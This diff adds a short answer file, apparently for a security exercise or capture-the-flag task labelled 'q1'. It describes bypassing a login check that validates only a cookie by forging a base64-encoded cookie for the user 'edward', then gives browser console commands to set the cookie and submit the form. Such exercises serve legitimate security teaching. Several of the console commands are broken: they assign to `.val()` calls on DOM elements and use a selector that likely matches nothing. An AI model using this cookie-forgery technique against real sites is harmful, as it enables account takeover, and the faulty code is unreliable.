@@ -1,0 +1,13 @@
+/
+q1: 
+
+Use the second function that validates login - validate_login, it doesn't check the password, only the received cookie. So we only need to send the correct cookie for 'edward' which is 
+cookie = base64.b64encode("edward".encode()).decode() = ZWR3YXJk 
+
+The JS console commands are: 
+/
+document.querySelector('input[name=username]').val() = "edward"; 
+document.querySelector('input[name=password]').val() = ""; 
+document.cookie = "login=ZWR3YXJk"; 
+document.querySelector('login').submit(); 
+
